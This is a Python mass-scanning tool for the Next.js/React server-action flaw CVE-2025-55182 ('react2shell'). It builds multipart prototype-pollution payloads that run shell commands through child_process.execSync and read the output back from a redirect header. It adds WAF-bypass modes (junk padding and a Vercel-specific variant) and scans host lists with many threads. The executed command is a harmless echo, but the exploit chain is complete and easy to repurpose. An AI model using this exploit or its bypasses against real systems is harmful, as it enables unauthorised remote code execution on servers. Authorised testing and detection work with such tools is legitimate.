#!/usr/bin/env python3

import argparse
import json
import os
import random
import re
import string
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"
    DIM = "\033[2m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"


def print_banner():
    banner = rf"""{Colors.CYAN}
    ___  ___  ___
   | _ \|_  )/ __| react2shell
   |   / / / \__ \ {Colors.GRAY}@zabesec{Colors.CYAN}
   |_|_\/___||___/
{Colors.RESET}"""
    print(banner)


def parse_headers(header_list: list[str] | None) -> dict[str, str]:
    headers = {}
    if not header_list:
        return headers
    for header in header_list:
        if ": " in header:
            key, value = header.split(": ", 1)
            headers[key] = value
        elif ":" in header:
            key, value = header.split(":", 1)
            headers[key] = value.lstrip()
    return headers


def normalize_host(host: str) -> str:
    host = host.strip()
    if not host:
        return ""
    if not host.startswith(("http://", "https://")):
        host = f"https://{host}"
    return host.rstrip("/")


def generate_junk_data(size_bytes: int) -> tuple[str, str]:
    param_name = "".join(random.choices(string.ascii_lowercase, k=12))
    junk = "".join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
    return param_name, junk


def build_safe_payload() -> tuple[str, str]:
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_vercel_waf_bypass_payload() -> tuple[str, str]:
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
        "\"var res=process.mainModule.require('child_process').execSync('echo $((41*271))').toString().trim();;"
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});\","
        '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
    )

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="3"\r\n\r\n'
        f'{{"\\"\u0024\u0024":{{}}}}\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_rce_payload(
    waf_bypass: bool = False, waf_bypass_size_kb: int = 128
) -> tuple[str, str]:
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    cmd = "echo $((41*271))"

    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    parts = []

    if waf_bypass:
        param_name, junk = generate_junk_data(waf_bypass_size_kb * 1024)
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
            f"{junk}\r\n"
        )

    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def resolve_redirects(
    url: str, timeout: int, verify_ssl: bool, max_redirects: int = 10
) -> str:
    current_url = url
    original_host = urlparse(url).netloc

    for _ in range(max_redirects):
        try:
            response = requests.head(
                current_url, timeout=timeout, verify=verify_ssl, allow_redirects=False
            )
            if response.status_code in (301, 302, 303, 307, 308):
                location = response.headers.get("Location")
                if location:
                    if location.startswith("/"):
                        parsed = urlparse(current_url)
                        current_url = f"{parsed.scheme}://{parsed.netloc}{location}"
                    else:
                        new_host = urlparse(location).netloc
                        if new_host == original_host:
                            current_url = location
                        else:
                            break
                else:
                    break
            else:
                break
        except RequestException:
            break
    return current_url


def send_payload(
    target_url: str, headers: dict, body: str, timeout: int, verify_ssl: bool
) -> tuple[requests.Response | None, str | None]:
    try:
        body_bytes = body.encode("utf-8") if isinstance(body, str) else body
        response = requests.post(
            target_url,
            headers=headers,
            data=body_bytes,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False,
        )
        return response, None
    except requests.exceptions.SSLError as e:
        return None, f"SSL Error: {str(e)}"
    except requests.exceptions.ConnectionError as e:
        return None, f"Connection Error: {str(e)}"
    except requests.exceptions.Timeout:
        return None, "Request timed out"
    except RequestException as e:
        return None, f"Request failed: {str(e)}"
    except Exception as e:
        return None, f"Unexpected error: {str(e)}"


def is_vulnerable_safe_check(response: requests.Response) -> bool:
    if response.status_code != 500 or 'E{"digest"' not in response.text:
        return False

    server_header = response.headers.get("Server", "").lower()
    has_netlify_vary = "Netlify-Vary" in response.headers
    is_mitigated = (
        has_netlify_vary or server_header == "netlify" or server_header == "vercel"
    )

    return not is_mitigated


def is_vulnerable_rce_check(response: requests.Response) -> bool:
    redirect_header = response.headers.get("X-Action-Redirect", "")
    return bool(re.search(r".*/login\?a=11111.*", redirect_header))


def check_vulnerability(
    host: str,
    timeout: int = 10,
    verify_ssl: bool = True,
    follow_redirects: bool = True,
    custom_headers: dict[str, str] | None = None,
    waf_bypass: str | None = None,
    waf_bypass_size_kb: int = 128,
) -> dict:
    result = {
        "host": host,
        "vulnerable": None,
        "status_code": None,
        "error": None,
        "request": None,
        "response": None,
        "final_url": None,
        "timestamp": datetime.now(timezone.utc).isoformat() + "Z",
        "unreachable": False,
    }

    host = normalize_host(host)
    if not host:
        result["error"] = "Invalid or empty host"
        return result

    root_url = f"{host}/"

    if waf_bypass == "vercel":
        body, content_type = build_vercel_waf_bypass_payload()
        is_vulnerable = is_vulnerable_rce_check
    elif waf_bypass:
        body, content_type = build_rce_payload(
            waf_bypass=True,
            waf_bypass_size_kb=waf_bypass_size_kb,
        )
        is_vulnerable = is_vulnerable_rce_check
    else:
        body, content_type = build_safe_payload()
        is_vulnerable = is_vulnerable_safe_check

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 R2S/0.6.9",
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Content-Type": content_type,
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    }

    if custom_headers:
        headers.update(custom_headers)

    def build_request_str(url: str) -> str:
        parsed = urlparse(url)
        req_str = f"POST {'/aaa' or '/aaa'} HTTP/1.1\r\n"
        req_str += f"Host: {parsed.netloc}\r\n"
        for k, v in headers.items():
            req_str += f"{k}: {v}\r\n"
        req_str += f"Content-Length: {len(body)}\r\n\r\n"
        req_str += body
        return req_str

    def build_response_str(resp: requests.Response) -> str:
        resp_str = f"HTTP/1.1 {resp.status_code} {resp.reason}\r\n"
        for k, v in resp.headers.items():
            resp_str += f"{k}: {v}\r\n"
        resp_str += f"\r\n{resp.text[:2000]}"
        return resp_str

    result["final_url"] = root_url
    result["request"] = build_request_str(root_url)

    response, error = send_payload(root_url, headers, body, timeout, verify_ssl)

    if error:
        result["error"] = error
        if "Connection Error" in error or "Request timed out" in error:
            result["unreachable"] = True
        return result

    result["status_code"] = response.status_code
    result["response"] = build_response_str(response)

    if is_vulnerable(response):
        result["vulnerable"] = True
        return result

    if follow_redirects:
        try:
            redirect_url = resolve_redirects(root_url, timeout, verify_ssl)
            if redirect_url != root_url:
                response, error = send_payload(
                    redirect_url, headers, body, timeout, verify_ssl
                )

                if error:
                    result["vulnerable"] = False
                    return result

                result["final_url"] = redirect_url
                result["request"] = build_request_str(redirect_url)
                result["status_code"] = response.status_code
                result["response"] = build_response_str(response)

                if is_vulnerable(response):
                    result["vulnerable"] = True
                    return result
        except Exception:
            pass

    result["vulnerable"] = False
    return result


def load_hosts(hosts_file: str) -> list[str]:
    hosts = []
    try:
        with open(hosts_file, "r") as f:
            for line in f:
                host = line.strip()
                if host and not host.startswith("#"):
                    hosts.append(host)
    except FileNotFoundError:
        print(f"[{colorize('error', Colors.RED)}] Could not find list '{hosts_file}'")
        sys.exit(1)
    except Exception as e:
        print(f"[{colorize('error', Colors.RED)}] {e}")
        sys.exit(1)
    return hosts


def load_hosts_from_stdin() -> list[str]:
    hosts = []
    for line in sys.stdin:
        host = line.strip()
        if host and not host.startswith("#"):
            hosts.append(host)
    return hosts


def save_results(results: list[dict], output_file: str):
    results = [r for r in results if r.get("vulnerable") is True]

    output = {
        "scan_time": datetime.now(timezone.utc).isoformat() + "Z",
        "total_results": len(results),
        "results": results,
    }

    try:
        with open(output_file, "w") as f:
            json.dump(output, f, indent=2)
        print(
            f"\n[{colorize('info', Colors.CYAN)}] Scan finished. Results saved to {output_file}"
        )
    except Exception as e:
        print(f"\n[{colorize('error', Colors.RED)}] Failed to save results: {e}")


def print_result_nuclei_style(result: dict):
    host = result["host"]

    if result.get("unreachable"):
        print(f"{Colors.DIM}[unreachable] {host}{Colors.RESET}")
    elif result["vulnerable"] is True:
        print(f"[{colorize('vulnerable', Colors.RED)}] {host}")
    elif result["vulnerable"] is False:
        print(f"[{colorize('ok', Colors.GREEN)}] {host}")
    else:
        error_msg = result.get("error", "Unknown error")
        print(f"[{colorize('error', Colors.YELLOW)}] {host} ({error_msg})")


def main():
    parser = argparse.ArgumentParser(
        description="React2Shell Scanner - CVE-2025-55182",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    input_group = parser.add_mutually_exclusive_group(required=False)
    input_group.add_argument("-u", help="Single URL/host to check")
    input_group.add_argument("-l", help="File containing list of hosts (one per line)")

    parser.add_argument(
        "-t",
        type=int,
        default=10,
        help="Number of concurrent threads (default: 10)",
    )
    parser.add_argument(
        "-timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)",
    )
    parser.add_argument("-output", help="Output file for results (JSON format)")
    parser.add_argument(
        "-k",
        default=True,
        action="store_true",
        help="Disable SSL certificate verification",
    )
    parser.add_argument(
        "-H",
        action="append",
        dest="headers",
        metavar="HEADER",
        help="Custom header in 'Key: Value' format",
    )
    parser.add_argument(
        "-wb",
        choices=["standard", "vercel"],
        help="WAF bypass mode: 'standard' or 'vercel'",
    )
    parser.add_argument(
        "-wbsize",
        type=int,
        default=128,
        metavar="KB",
        help="Size of junk data in KB for standard WAF bypass (default: 128)",
    )

    args = parser.parse_args()

    print_banner()

    if args.u:
        hosts = [args.u]
    elif args.l:
        hosts = load_hosts(args.l)
    elif not sys.stdin.isatty():
        hosts = load_hosts_from_stdin()
    else:
        parser.print_help()
        sys.exit(1)

    if not hosts:
        print(f"[{colorize('error', Colors.RED)}] No hosts to scan")
        sys.exit(1)

    timeout = args.timeout
    if args.wb == "standard" and args.timeout == 10:
        timeout = 20

    results = []
    vulnerable_count = 0
    error_count = 0

    verify_ssl = not args.k
    custom_headers = parse_headers(args.headers)

    if args.k:
        import urllib3

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if len(hosts) == 1:
        result = check_vulnerability(
            hosts[0],
            timeout,
            verify_ssl,
            custom_headers=custom_headers,
            waf_bypass=args.wb,
            waf_bypass_size_kb=args.wbsize,
        )
        results.append(result)
        print_result_nuclei_style(result)
        if result["vulnerable"]:
            vulnerable_count = 1
    else:
        with ThreadPoolExecutor(max_workers=args.t) as executor:
            futures = {
                executor.submit(
                    check_vulnerability,
                    host,
                    timeout,
                    verify_ssl,
                    custom_headers=custom_headers,
                    waf_bypass=args.wb,
                    waf_bypass_size_kb=args.wbsize,
                ): host
                for host in hosts
            }

            for future in as_completed(futures):
                result = future.result()
                results.append(result)

                if result["vulnerable"]:
                    vulnerable_count += 1
                elif result["error"]:
                    error_count += 1

                print_result_nuclei_style(result)

    if args.output:
        save_results(results, args.output)

    if vulnerable_count > 0:
        sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()
